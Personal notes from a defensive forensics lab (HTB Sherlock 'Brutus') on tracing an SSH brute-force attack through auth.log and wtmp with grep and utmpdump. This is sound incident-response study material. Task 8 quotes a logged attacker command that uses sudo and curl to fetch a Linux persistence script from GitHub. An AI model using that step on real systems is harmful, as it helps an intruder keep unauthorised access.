---
title: Brutus
date modified: Tuesday, May 14th 2024, 7:58:50 pm
---

I will note that I like the way that this guy has done this task, by creating a timeline of what the attack did: https://0xdf.gitlab.io/2024/04/09/htb-sherlock-brutus.html# 
##### Sherlock Scenario
*In this very easy Sherlock, you will familiarise yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.*

### Task 1:
*Analysing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?*

Looking at the **auth.log** file and grepping for rhosts, we can see that a certain IP address (65.2.161.68), has failed authentication many times to the confluence server. This should be the attacker controlled IP.

```Bash
cat auth.log | grep rhost
```

### Task 2:
*The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?*

We are able to grep for **Accepted Password** which shows that the first account that the attacker was able to log-in to was **root**

```Bash
cat auth.log | grep "Accepted password"

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
```

## Task 3:

*Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?*

To do this we need to look at the wtmp file. We can view this file in various ways:
1. utmp dump
	1. This gives us lots of information about the users that have been using the system. 
	2. We want to filter for **[7]** as that is the code for a user logging in. [6] is used for when a log in session is terminated.
		1. https://linux.die.net/man/5/wtmp
	3. If we look at this input, we can see a login from the attacker controlled IP (65.2.161.68)
```Bash
utmpdump wtmp | grep -w "\[7\]" # This enables us to search for every login.
...SNIP...
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]

# Other useful commands for parsing a wtmp file.
who wtmp
last wtmp
```

We can convert this timestamp into: **2024-03-06 06:32:45**
### Task 4:
*SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?*

If we look at around the time in which the attacker logged in, we can see that it is session 37. We can search for this quickly, since SSH sessions will be given a session number as soon as a user logs in.
```Bash
cat auth.log | grep "06:32:[0-9][0-9]" # Gives us all the commands that happened within the minute of when the attacker logged in.

Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

### Task 5:
*The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?*

We can see the name **cyberjunkie** on both the auth.log and wtmp file
```BASH
utmpdump wmtp

...SNIP...
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

### Task 6:
*What is the MITRE ATT&CK sub-technique ID used for persistence?*

By looking at the [MITRE documentation](https://attack.mitre.org/techniques/T1136/001/), we can figure out that the ID is T1136.001. Where:

- T1136 - Account Creation
	- Our attacker has created an account so that they can maintain access to the compromised system
- 001 - Local Account
	- The account is local on the system

### Task 7:

*How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)*

Using the knowledge that we know that the attackers session was session 37, we can grep for it and calculate how many seconds they were connected for.
```Bash
cat auth.log | grep "session 37"

Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

which is 279 seconds, as the auth.log and wtmp log in have a 1 second difference.

### Task 8

*The attacker logged into their backdoor account and utilised their higher privileges to download a script. What is the full command executed using sudo?*

We can see a github repo being curled int our system
```Bash
cat auth.log | grep "github"

Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

```